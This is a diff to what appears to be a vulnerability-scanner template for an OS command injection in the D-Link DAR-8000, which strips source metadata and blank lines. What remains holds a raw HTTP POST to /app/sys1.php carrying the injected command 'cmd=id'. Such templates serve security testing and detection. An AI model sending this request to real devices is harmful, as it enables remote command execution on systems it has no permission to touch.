@@ -3,12 +3,8 @@ info:
   name: D-Link DAR-8000操作系统命令注入漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/iv6zygx3pnom20sq'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: iv6zygx3pnom20sq
-    fofa: 暂无
 http:
 - raw:
   - 'POST /app/sys1.php HTTP/1.1
@@ -36,8 +32,6 @@ http:
 
 
     Content-Length: 6
-
-
 
 
     cmd=id
